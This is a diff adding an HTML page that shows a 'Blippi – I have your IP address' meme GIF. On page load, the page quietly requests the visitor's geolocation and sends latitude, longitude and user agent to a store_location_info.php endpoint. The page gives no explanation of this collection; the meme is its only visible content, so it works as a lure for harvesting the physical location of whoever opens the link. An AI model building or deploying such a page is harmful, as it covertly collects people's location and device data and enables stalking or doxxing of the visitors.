@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body onload="getLocation()">
+    <div class="tenor-gif-embed" data-postid="25511125" data-share-method="host" data-aspect-ratio="1.70213" data-width="100%">
+        <a href="https://tenor.com/view/blippi-blippi-meme-ip-address-ip-address-meme-i-have-your-ip-address-gif-25511125">Blippi Blippi Meme GIF</a>
+        from <a href="https://tenor.com/search/blippi-gifs">Blippi GIFs</a>
+    </div> 
+    <!-- <p id="demo"></p> -->
+
+    <script type="text/javascript" async src="https://tenor.com/embed.js"></script>
+    <script>
+        // var x = document.getElementById("demo");
+        function getLocation() {
+          if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(showPosition);
+          } 
+        }
+        
+        function showPosition(position) {
+            // perform ajax request 
+            const xhttp = new XMLHttpRequest();
+            xhttp.open("GET", "./store_location_info.php?latittude=" + position.coords.latitude + "&longitude=" + position.coords.longitude  + "&useragent=" + navigator.userAgent);
+            xhttp.send();
+
+        }
+        // showPosition();
+    </script>
+</body>
+</html>
